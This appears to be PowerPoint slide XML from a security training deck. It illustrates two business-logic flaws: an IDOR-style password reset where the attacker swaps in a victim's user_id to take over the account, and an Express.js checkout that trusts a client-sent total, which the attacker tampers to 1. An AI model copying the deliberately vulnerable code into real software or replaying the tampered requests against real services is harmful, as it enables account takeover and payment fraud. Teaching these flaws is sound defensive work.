              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>https://bank.com/reset?token=abc123xyz789</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Image 2" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="6293763"/>
            <a:ext cx="3912751" cy="453628"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="6804065"/>
            <a:ext cx="2709029" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Attacker modifies user_id to victim's ID</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="7053739"/>
            <a:ext cx="3686056" cy="1258729"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3784"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="7053739"/>
            <a:ext cx="3697248" cy="1258729"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1352"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3623548" y="7138749"/>
            <a:ext cx="3470553" cy="1088708"/>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ATTACK: Change user_id to victim</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POST /api/reset-password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"user_id": 2500,  # ← VICTIM'S USER ID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"reset_token": "abc123xyz789",</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"new_password": "hacked123"</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Response: {"status": "success"}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="22" name="Image 3" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="6293763"/>
            <a:ext cx="3912751" cy="453628"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7428548" y="6804065"/>
            <a:ext cx="1847017" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Account takeover complete</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7428548" y="7053739"/>
            <a:ext cx="3686056" cy="1122640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4243"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7422952" y="7053739"/>
            <a:ext cx="3697248" cy="1122640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1515"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7536299" y="7138749"/>
            <a:ext cx="3470553" cy="952619"/>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Attacker logs in as victim</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POST /api/login</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"username": "victim@example.com",</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"password": "hacked123"</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SUCCESS! Attacker gains access to victim's bank account</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="8489513"/>
            <a:ext cx="7825502" cy="1007745"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4727"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B3E5FF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="28" name="Image 4" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="8581430"/>
            <a:ext cx="185976" cy="148828"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3815120" y="8574524"/>
            <a:ext cx="1488519"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Impact:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3815120" y="8817173"/>
            <a:ext cx="7299484" cy="544388"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Complete account takeover</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Access to victim's funds</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Unauthorized wire transfers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Identity theft</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02449" y="723424"/>
            <a:ext cx="4919543"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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6.3 E-commerce Price Manipulation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1118116"/>
            <a:ext cx="2143244"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Scenario: Online Shopping Cart</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1326713"/>
            <a:ext cx="2021800"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Vulnerable Checkout Process:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1597700"/>
            <a:ext cx="7825502" cy="2483525"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1918"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="1597700"/>
            <a:ext cx="7836694" cy="2483525"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 685"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="1682710"/>
            <a:ext cx="7609999" cy="2313503"/>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Express.js - VULNERABLE CODE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app.post('/api/checkout', authenticateUser, async (req, res) =&gt;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const { items, total } = req.body;</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 TRUSTS CLIENT-SIDE CALCULATION!</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const order = await Order.create({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userId: req.user.id,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items: items,</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total: total,  // ← DANGEROUS: Accepts total from client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status: 'pending'</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 Process payment for client-provided total</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await processPayment(req.user.id, total);</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res.json({ orderId: order.id, status: 'success'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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="4166235"/>
            <a:ext cx="1488519"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Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="4493895"/>
            <a:ext cx="2185273"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Step 1: Normal checkout request</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="4743569"/>
            <a:ext cx="3774400" cy="1666994"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2857"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="4743569"/>
            <a:ext cx="3785592" cy="1666994"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1021"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="4828580"/>
            <a:ext cx="3558897" cy="1496973"/>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POST /api/checkout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Authorization: Bearer user_token</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Content-Type: application/json</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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"items":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{"id": 101, "name": "Laptop", "price": 1500, "quantity": 1},</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{"id": 102, "name": "Mouse", "price": 50, "quantity": 1}</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"total": 1550</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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7379494" y="4437221"/>
            <a:ext cx="3937754" cy="2309217"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3536"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD">
              <a:alpha val="95000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7492841" y="4493895"/>
            <a:ext cx="3265527" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 2: Attacker intercepts and modifies request</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7492841" y="4743569"/>
            <a:ext cx="3711059" cy="1939171"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2456"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7487245" y="4743569"/>
            <a:ext cx="3722251" cy="1939171"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 877"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7600593" y="4828580"/>
            <a:ext cx="3495556" cy="1769150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>POST /api/checkout</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Authorization: Bearer user_token</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Content-Type: application/json</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  "items": [</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    {"id": 101, "name": "Laptop", "price": 1500, "quantity": 1},</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    {"id": 102, "name": "Mouse", "price": 50, "quantity": 1}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>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000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  "total": 1  ← MODIFIED: Changed from 1550 to 1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Response: {"orderId": 12345, "status": "success"}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="6810137"/>
            <a:ext cx="7825502" cy="696039"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6844"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B3E5FF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
